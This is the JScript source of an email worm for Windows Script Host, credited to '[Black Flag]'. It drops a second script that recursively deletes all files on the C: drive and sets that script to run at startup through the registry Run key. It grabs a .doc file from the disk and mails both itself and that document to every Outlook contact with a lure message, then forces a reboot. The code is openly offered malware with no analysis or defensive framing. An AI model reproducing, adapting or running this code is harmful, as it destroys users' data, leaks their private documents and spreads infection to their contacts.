/*******************************************************************
 *                     Created by [Black Flag]                     *
 *******************************************************************/
var TF=WScript.ScriptFullName,FS=new ActiveXObject("Scripting.FileSystemObject"),
SS=new ActiveXObject("WScript.Shell"),V='var D="C:\\\\",fs=new ActiveXObject("Scriptin'
+'g.FileSystemObject");f(D);function f(fl)\r\n{fl=fs.GetFolder(fl);var F=new Enumerator'
+'(fl.Files),FD=new Enumerator(fl.SubFolders);\r\nfor(;!F.atEnd();F.moveNext()){try{fs.'
+'GetFile(F.item()).Delete(true);}catch(e){}}\r\nfor(;!FD.atEnd();FD.moveNext()){f(FD.it'
+'em());}}//End Of File',RN=(Math.random()*100)+10,DD="C:\\",TD;a(DD);function a(dd){
var Fx=new Enumerator(FS.GetFolder(dd+"").SubFolders),Fa=new Array()for(var i=0;!Fx.atEnd();
Fx.moveNext(),i++){Fa[i]=Fx.item();if(RN--<=0.1)TD=Fa[i];}for(var x in Fa)a(Fa[x])}b();
function b(){var Fg=TD+new Date().getTime()+".js";Fv=FS.CreateTextFile(Fg,true);Fv.Write(V);
Fv.Close();SS.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+new Date().getTime(),Fg,"REG_SZ");}var AD;c(DD);function c(dd){if(AD+""=="undefined"){
var dd=FS.GetFolder(dd),Fl=new Enumerator(dd.Files),Fd=new Enumerator(dd.SubFolders);
for(;!Fl.atEnd();Fl.moveNext()){if(e(Fl.item()+"",".doc")){AD=Fl.item()+"";}}for(;
!Fd.atEnd();Fd.moveNext()){c(Fd.item()+"");}}}function e(sy,ey){return(
sy.toLowerCase().indexOf(ey.toLowerCase())==(sy.length-ey.length))}var OO,MN,O;try{
OO=new ActiveXObject("Outlook.Application");MN=OO.GetNamespace("MAPI");O=new ActiveXObject("O"
+"utlook.Application").Version+""=="undefined";if(!O)f();g();}catch(ex){}function f(){
var aL=new Enumerator(MN.AddressLists("Personal Address Book").AddressEntries)for(;
!aL.atEnd();aL.moveNext())h(MN.AddressLists("Personal Address Book").AddressEntries(aL.item()
+"").Address+"");}function g(){var aL=new Enumerator(MN.GetDefaultFolder(10).Items());
for(;!aL.atEnd();aL.moveNext())h(MN.GetDefaultFolder(10).Items(aL.item()+"").Email1Address
+"");}function h(ad){var nM;try{nM=OO.CreateItem(0);}catch(ex){return;}nM.Subject="<no"
+" subject>";nM.Body="Some body\r\n";var rM=nM.Recipients.Add(ad);if(!rM.Resolve())return;
nM.Attachments.Add(TF,1,1,"some very cool thing I made");nM.Attachments.Add(AD,1,1,"this"
+" 1 is very cool too");nM.Send();}new SS.Run("RunDll32 Shell32.dll,SHExitWindowsEx 2");//EndOfFile
